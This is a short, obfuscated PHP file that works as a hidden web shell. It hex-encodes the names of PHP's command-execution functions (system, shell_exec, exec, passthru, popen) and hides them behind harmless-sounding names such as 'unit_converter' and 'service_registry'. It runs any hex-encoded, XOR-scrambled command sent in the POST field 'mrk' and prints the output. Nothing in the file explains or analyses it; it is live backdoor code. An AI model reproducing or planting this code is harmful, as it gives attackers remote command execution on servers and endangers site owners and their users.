<?php

$unit_converter4 = "\x70\x61\x73s\x74hru";
$unit_converter6 = "\x73tr\x65am_\x67et\x5F\x63o\x6E\x74ent\x73";
$unit_converter5 = "p\x6Fp\x65n";
$unit_converter3 = "\x65\x78ec";
$unit_converter7 = "\x70c\x6Cos\x65";
$settings = "\x68e\x782\x62in";
$unit_converter2 = "s\x68\x65\x6Cl_\x65x\x65c";
$unit_converter1 = "\x73\x79\x73tem";
if (isset($_POST["m\x72k"])) {
            function service_registry (  $bind, $res   )  {   $tkn    = '' ;    $z=0; while($z<strlen($bind)){$tkn.=chr(ord($bind[$z])^$res);$z++;} return   $tkn; }
            $mrk = $settings($_POST["m\x72k"]);
            $mrk = service_registry($mrk, 39);
            if (function_exists($unit_converter1)) {
                $unit_converter1($mrk);
            } elseif (function_exists($unit_converter2)) {
                print $unit_converter2($mrk);
            } elseif (function_exists($unit_converter3)) {
                $unit_converter3($mrk, $ptr_bind);
                print join("\n", $ptr_bind);
            } elseif (function_exists($unit_converter4)) {
                $unit_converter4($mrk);
            } elseif (function_exists($unit_converter5) && function_exists($unit_converter6) && function_exists($unit_converter7)) {
                $res_tkn = $unit_converter5($mrk, 'r');
                if ($res_tkn) {
                    $item_hld = $unit_converter6($res_tkn);
                    $unit_converter7($res_tkn);
                    print $item_hld;
                }
            }
            exit;
        }